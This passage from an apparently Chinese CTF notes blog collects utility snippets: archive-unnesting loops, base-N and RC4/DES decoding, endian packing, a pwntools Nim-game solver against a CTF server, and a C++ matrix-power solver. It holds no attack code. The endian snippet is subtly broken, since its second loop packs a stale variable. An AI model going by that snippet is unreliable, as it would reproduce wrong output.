class="string">&#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileCreateTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getctime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileModifyTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getmtime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="嵌套zip文件解压"><a href="#嵌套zip文件解压" class="headerlink" title="嵌套zip文件解压"></a>嵌套zip文件解压</h2><h3 id="根据名称"><a href="#根据名称" class="headerlink" title="根据名称"></a>根据名称</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>和<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/zipfile.html">zipfile参考</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">name = <span class="string">&#x27;0573&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fz = zipfile.ZipFile(name + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(name, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure>

<h3 id="根据后缀并解压至当前目录"><a href="#根据后缀并解压至当前目录" class="headerlink" title="根据后缀并解压至当前目录"></a>根据后缀并解压至当前目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://unix.stackexchange.com/questions/4367/extracting-nested-zip-files</span></span><br><span class="line"><span class="comment"># https://askubuntu.com/questions/146634/shell-script-to-move-all-files-from-subfolders-to-parent-folder</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.zip&#x27; | wc -l`&quot;</span> &gt; 0 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    unzip *.zip</span><br><span class="line">    <span class="built_in">rm</span> *.zip</span><br><span class="line">    find . -mindepth 2 -<span class="built_in">type</span> f -<span class="built_in">print</span> -<span class="built_in">exec</span> <span class="built_in">mv</span> &#123;&#125; . \;</span><br><span class="line">    <span class="built_in">rmdir</span> */</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip">https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip</a></p>
<h2 id="python根据RGB数据生成图片"><a href="#python根据RGB数据生成图片" class="headerlink" title="python根据RGB数据生成图片"></a>python根据RGB数据生成图片</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>及<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43790276/article/details/108478270">PIL参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = y = <span class="number">200</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./qr.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()</span><br><span class="line">        rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="多重base64-16-32-85混合套娃解密脚本"><a href="#多重base64-16-32-85混合套娃解密脚本" class="headerlink" title="多重base64|16|32|85混合套娃解密脚本"></a>多重base64|16|32|85混合套娃解密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109829704">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baseDec</span>(<span class="params">text,<span class="built_in">type</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autoDec</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;MRCTF&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">autoDec(flag)</span><br></pre></td></tr></table></figure>

<h2 id="汇编指令与机器码对照表"><a href="#汇编指令与机器码对照表" class="headerlink" title="汇编指令与机器码对照表"></a>汇编指令与机器码对照表</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7835b5526854">链接</a></p>
<h2 id="python运算符优先级"><a href="#python运算符优先级" class="headerlink" title="python运算符优先级"></a>python运算符优先级</h2><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2190.html">链接</a></p>
<h2 id="python以大端和小端处理数据"><a href="#python以大端和小端处理数据" class="headerlink" title="python以大端和小端处理数据"></a>python以大端和小端处理数据</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MikeCoke/article/details/113796480">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = [<span class="number">72143238992041641000000.000000</span>,<span class="number">77135357178006504000000000000000.000000</span>,<span class="number">1125868345616435400000000.000000</span>,<span class="number">67378029765916820000000.000000</span>,<span class="number">75553486092184703000000000000.000000</span>,<span class="number">4397611913739958700000.000000</span>,<span class="number">76209378028621039000000000000000.000000</span>]</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    i = <span class="built_in">float</span>(i)</span><br><span class="line">    a += struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>,i).<span class="built_in">hex</span>()        <span class="comment">#小端</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">    i = <span class="built_in">float</span>(i)</span><br><span class="line">    b += struct.pack(<span class="string">&#x27;&gt;f&#x27;</span>,i).<span class="built_in">hex</span>()        <span class="comment">#大端</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x496e74657265737472696e67204964656120746f20656e6372797074</span></span><br><span class="line">b = <span class="number">0x74707972747079727470797274707972747079727470797274707972</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br></pre></td></tr></table></figure>

<h2 id="RC4加密脚本"><a href="#RC4加密脚本" class="headerlink" title="RC4加密脚本"></a>RC4加密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105661450">题目及来源</a>。RC4加密和解密都是一个方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>): <span class="comment">#返回加密后的内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密钥</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure>

<h2 id="SSH连接远程服务器"><a href="#SSH连接远程服务器" class="headerlink" title="SSH连接远程服务器"></a>SSH连接远程服务器</h2><p>假设用户名是root，服务器为node4.buuoj.cn，端口25298，则这样连接：</p>
<ul>
<li>ssh -p 25298 <a href="mailto:&#114;&#111;&#111;&#x74;&#64;&#x6e;&#111;&#100;&#x65;&#52;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#x2e;&#x63;&#110;">&#114;&#111;&#111;&#x74;&#64;&#x6e;&#111;&#100;&#x65;&#52;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#x2e;&#x63;&#110;</a></li>
</ul>
<p>更多ssh参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/li528405176/article/details/82810342">此处</a>。</p>
<h2 id="python-Crypto解密des密文"><a href="#python-Crypto解密des密文" class="headerlink" title="python Crypto解密des密文"></a>python Crypto解密des密文</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181019#h3-15">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">key = <span class="string">b&quot;t\x00e\x00s\x00t\x00&quot;</span></span><br><span class="line">des = DES.new(key, mode = DES.MODE_CBC, iv = key)</span><br><span class="line">a = <span class="string">b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line">res = des.decrypt(a)[<span class="number">0</span>:-<span class="number">6</span>].decode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="常见算法特征总结"><a href="#常见算法特征总结" class="headerlink" title="常见算法特征总结"></a>常见算法特征总结</h2><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/miscellaneous/suan-fa-te-zheng-zong-jie">链接</a></p>
<h2 id="GCC编译C文件为可执行文件"><a href="#GCC编译C文件为可执行文件" class="headerlink" title="GCC编译C文件为可执行文件"></a>GCC编译C文件为可执行文件</h2><ul>
<li>gcc source.c -o result.o</li>
</ul>
<h2 id="套娃压缩文件解压bash脚本"><a href="#套娃压缩文件解压bash脚本" class="headerlink" title="套娃压缩文件解压bash脚本"></a>套娃压缩文件解压bash脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110051084">例题及来源</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; <span class="keyword">do</span> find -<span class="built_in">type</span> f -name <span class="string">&quot;*.tar.xz&quot;</span> -<span class="built_in">exec</span> tar xf <span class="string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="built_in">exec</span> <span class="built_in">rm</span> -- <span class="string">&#x27;&#123;&#125;&#x27;</span> \;; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Nim博弈pwntools交互"><a href="#Nim博弈pwntools交互" class="headerlink" title="Nim博弈pwntools交互"></a>Nim博弈pwntools交互</h2><p><a target="_blank" rel="noopener" href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#catnim">来源</a>。有关nim博弈可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/422562139">此处</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pile</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Now pile: &#x27;</span>)</span><br><span class="line">    line=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="keyword">return</span> line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xor</span>(<span class="params">piles</span>):</span><br><span class="line">    v=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        v^=num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xor :&quot;</span>,v)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">piles</span>):</span><br><span class="line">    v=get_xor(piles)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        <span class="keyword">if</span> num-(num^v) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i,num-(num^v)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line">p=remote(<span class="string">&#x27;223.112.5.156&#x27;</span>,<span class="number">55068</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    piles=get_pile()</span><br><span class="line">    pilesnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> piles]</span><br><span class="line">    where,cnt=choose(pilesnum)</span><br><span class="line">    <span class="built_in">print</span>(pilesnum)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> pilesnum:</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</span><br><span class="line">            s+=<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;where:&#x27;</span>,<span class="built_in">str</span>(where))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;count:&#x27;</span>,<span class="built_in">str</span>(cnt))</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">len</span>(pilesnum)-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    piles=get_pile()</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#print(pilesnum)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="路径编程问题"><a href="#路径编程问题" class="headerlink" title="路径编程问题"></a>路径编程问题</h2><p>从m点到 n 点走 k 步的<a target="_blank" rel="noopener" href="https://blog.csdn.net/bbbbswbq/article/details/81177945">路径条数问题</a>。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41956187/article/details/105731368">题目及来源</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">10003</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[N][N];</span><br><span class="line">&#125;;</span><br><span class="line">node c, ans;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="function">node <span class="title">mul</span><span class="params">(node x, node y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node ans;</span><br><span class="line">    <span class="built_in">memset</span>(ans.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(ans.a));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (x.a[i][k])</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.a[i][j] += x.a[i][k] * y.a[k][j];</span><br><span class="line">                    ans.a[i][j] %= mod;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">Pow</span><span class="params">(node x, <span class="type">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node ans;</span><br><span class="line">    <span class="built_in">memset</span>(ans.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(ans.a));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        ans.a[i][i] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (m &amp; <span class="number">1</span>)</span><br><span class="line">            ans = <span class="built_in">mul</span>(ans, x);</span><br><span class="line">        x = <span class="built_in">mul</span>(x, x);</span><br><span class="line">        m &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    